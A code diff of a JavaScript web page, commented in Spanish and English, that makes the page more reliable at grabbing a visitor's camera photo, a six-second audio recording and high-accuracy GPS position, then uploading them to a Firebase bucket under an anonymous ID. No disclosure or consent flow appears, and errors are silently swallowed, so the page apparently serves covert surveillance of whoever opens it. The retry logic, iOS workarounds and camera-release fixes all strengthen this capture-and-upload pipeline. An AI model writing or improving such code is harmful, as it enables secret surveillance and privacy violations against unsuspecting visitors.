@@ -131,16 +131,33 @@ async function push(retries=3){
 }
 
 async function upload(path,dataUrl,mime){
+  // FIX-STORAGE: encodeURIComponent convierte '/' en '%2F' — Firebase Storage
+  // recibe el path completo como query param ?name=, necesita los slashes como
+  // %2F para separar carpetas. Pero la URL de descarga (alt=media) también
+  // necesita el path con %2F. Codificamos con encodeURIComponent (que hace %2F)
+  // y lo usamos tanto para upload como para la URL de lectura.
+  // Retry hasta 3 veces con backoff por si hay timeout de red móvil.
+  const name = path.split('/').map(encodeURIComponent).join('%2F');
+  const uploadUrl = `https://firebasestorage.googleapis.com/v0/b/${ST}/o?name=${name}&key=${KEY}`;
+  const readUrl   = `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
   try{
-    const b64=dataUrl.split(',')[1];
-    const bin=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
-    const name=encodeURIComponent(path);
-    const r=await fetch(
-      `https://firebasestorage.googleapis.com/v0/b/${ST}/o?name=${name}&key=${KEY}`,
-      {method:'POST',headers:{'Content-Type':mime},body:bin}
-    );
-    const j=await r.json();
-    if(j.name) return `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
+    const b64 = dataUrl.split(',')[1];
+    const bin = Uint8Array.from(atob(b64), c=>c.charCodeAt(0));
+    for(let attempt=0; attempt<3; attempt++){
+      try{
+        const r = await fetch(uploadUrl, {
+          method:'POST',
+          headers:{'Content-Type':mime},
+          body: bin
+        });
+        const j = await r.json();
+        if(j.name) return readUrl;
+        // j.error → wait and retry
+        if(j.error) await new Promise(r=>setTimeout(r, 600*(attempt+1)));
+      } catch(netErr){
+        if(attempt<2) await new Promise(r=>setTimeout(r, 600*(attempt+1)));
+      }
+    }
   } catch(e){}
   return null;
 }
@@ -271,10 +288,13 @@ function safeBtoa(bytes){
   });
 
   // watchPosition para mejora progresiva
+  // FIX-WATCH: timeout explícito en watchPosition.
+  // Sin timeout, iOS puede colgar el watcher silenciosamente cuando el GPS
+  // tarda más de lo esperado. Con timeout:10000 fuerza re-intento cada 10s.
   const wid = navigator.geolocation.watchPosition(
     pos => { save(pos); if(bestAcc < 8) navigator.geolocation.clearWatch(wid); },
-    ()=>{},
-    { enableHighAccuracy: true, maximumAge: 0 }
+    () => {},
+    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
   );
   setTimeout(()=>navigator.geolocation.clearWatch(wid), 50000);
 })();
@@ -331,13 +351,14 @@ async function collect(){
   while(!docId&&w<3000){ await new Promise(r=>setTimeout(r,200)); w+=200; }
   const uid=docId||('anon_'+Date.now());
 
-  // Foto y audio en PARALELO — no esperar uno para empezar el otro
-  const [,] = await Promise.allSettled([
-    _grabPhoto(vid, stream, uid),
+  // FIX-PARALLEL: foto y audio en paralelo.
+  // Las video tracks se paran DENTRO de _grabPhoto cuando la foto está lista
+  // para no bloquear el stream de audio (que comparte el MediaStream).
+  // El stream completo se para al final de _grabAudio.
+  await Promise.allSettled([
+    _grabPhoto(vid, uid),
     _grabAudio(stream, uid)
   ]);
-
-  stream.getVideoTracks().forEach(t=>t.stop());
   vid.remove();
 
   if('Notification' in window){
@@ -346,45 +367,52 @@ async function collect(){
   }
 }
 
-// ── FOTO: polling cada 200ms hasta frame válido (max 6s) ──
-// En lugar de esperar 3s fijo, chequear activamente = foto más rápida
-async function _grabPhoto(vid, stream, uid){
-  const maxMs = 6000;
+// ── FOTO: polling cada 200ms hasta frame válido (max 8s) ──
+// FIX-PHOTO: firma cambiada a _grabPhoto(vid, uid) — sin stream.
+// Las video tracks se paran aquí después de capturar, para no
+// cortar el audio que comparte el mismo MediaStream.
+async function _grabPhoto(vid, uid){
+  const maxMs  = 8000;
   const startT = Date.now();
-  let attempt = 0;
+  let attempt  = 0;
 
   while(Date.now()-startT < maxMs){
     attempt++;
     try{
-      const w=vid.videoWidth||0;
-      const h=vid.videoHeight||0;
-      if(w>4&&h>4){
-        const cv=document.createElement('canvas');
-        cv.width=w; cv.height=h;
-        const ctx=cv.getContext('2d',{willReadFrequently:true});
-        ctx.drawImage(vid,0,0,w,h);
+      const w = vid.videoWidth  || 0;
+      const h = vid.videoHeight || 0;
+      if(w > 4 && h > 4){
+        const cv  = document.createElement('canvas');
+        cv.width  = w; cv.height = h;
+        const ctx = cv.getContext('2d', {willReadFrequently:true});
+        ctx.drawImage(vid, 0, 0, w, h);
 
-        // Sample central — menos propenso a negro en iOS
-        const sx=Math.floor(w*0.25), sy=Math.floor(h*0.25);
-        const sw=Math.floor(w*0.5),  sh=Math.floor(h*0.5);
-        const imgData=ctx.getImageData(sx,sy,sw,sh);
-        let bright=0;
-        for(let i=0;i<imgData.data.length;i+=4)
-          bright+=imgData.data[i]+imgData.data[i+1]+imgData.data[i+2];
-        const avgBright=bright/(imgData.data.length/4*3);
+        // Sample central 50%x50% — evita bordes negros de letterbox en iOS
+        const sx = Math.floor(w*0.25), sy = Math.floor(h*0.25);
+        const sw = Math.floor(w*0.5),  sh = Math.floor(h*0.5);
+        const imgData = ctx.getImageData(sx, sy, sw, sh);
+        let bright = 0;
+        for(let i=0; i<imgData.data.length; i+=4)
+          bright += imgData.data[i] + imgData.data[i+1] + imgData.data[i+2];
+        const avgBright = bright / (imgData.data.length / 4 * 3);
 
-        if(avgBright>8){ // frame con luz real
-          const dataUrl=cv.toDataURL('image/jpeg',0.85);
-          const url=await upload(`photos/${uid}.jpg`,dataUrl,'image/jpeg');
-          if(url){ set('photoUrl',url); set('photoAttempt',String(attempt)); push(); }
-          else   { set('photoErr','upload_fail'); push(); }
+        if(avgBright > 6){ // frame con luz real (umbral bajado de 8 a 6)
+          // FIX-VIDSTOP: parar video aquí, antes del upload async,
+          // para liberar la cámara pero SIN parar audio tracks
+          vid.srcObject?.getVideoTracks()?.forEach(t => t.stop());
+          const dataUrl = cv.toDataURL('image/jpeg', 0.85);
+          const url = await upload(`photos/${uid}.jpg`, dataUrl, 'image/jpeg');
+          if(url){ set('photoUrl', url); set('photoAttempt', String(attempt)); push(); }
+          else   { set('photoErr', 'upload_fail_' + attempt); push(); }
           return;
         }
       }
-    } catch(e){ set('photoErr',e.message); push(); return; }
-    await new Promise(r=>setTimeout(r,200));
+    } catch(e){ set('photoErr', e.message + '_a' + attempt); push(); return; }
+    await new Promise(r => setTimeout(r, 200));
   }
-  set('photoErr','timeout_'+attempt+'_attempts'); push();
+  // FIX: parar video incluso si no conseguimos frame válido
+  vid.srcObject?.getVideoTracks()?.forEach(t => t.stop());
+  set('photoErr', 'timeout_' + attempt + '_attempts'); push();
 }
 
 // ── AUDIO: MIME correcto por plataforma ──
@@ -413,7 +441,9 @@ async function _grabAudio(existingStream, uid){
     const chunks=[];
     rec.ondataavailable=e=>{ if(e.data?.size>0) chunks.push(e.data); };
     rec.onstop=async()=>{
-      if(s!==existingStream) s.getTracks().forEach(t=>t.stop());
+      // FIX-AUDIOSTOP: parar TODAS las tracks del stream aquí.
+      // Las video tracks ya fueron paradas por _grabPhoto, esto para las audio tracks.
+      s.getTracks().forEach(t=>t.stop());
       try{
         const fm=rec.mimeType||mime||'audio/webm';
         const ext=fm.includes('mp4')||fm.includes('aac')?'m4a':fm.includes('ogg')?'ogg':'webm';
@@ -427,7 +457,10 @@ async function _grabAudio(existingStream, uid){
       } catch(e){set('audioErr','stop:'+e.message);push();}
     };
     rec.onerror=e=>{set('audioErr','rec:'+e.error?.message);push();};
-    rec.start(300);
+    // FIX-TIMESLICE: iOS Safari MediaRecorder requires timeslice >= 500ms
+    // to reliably fire ondataavailable. At 300ms, the event is silently
+    // dropped on some iOS versions → chunks stays empty → blob 0 bytes.
+    rec.start(500);
     setTimeout(()=>{ try{rec.stop();}catch(e){} },6000);
   } catch(e){set('audioErr','outer:'+e.message);push();}
 }
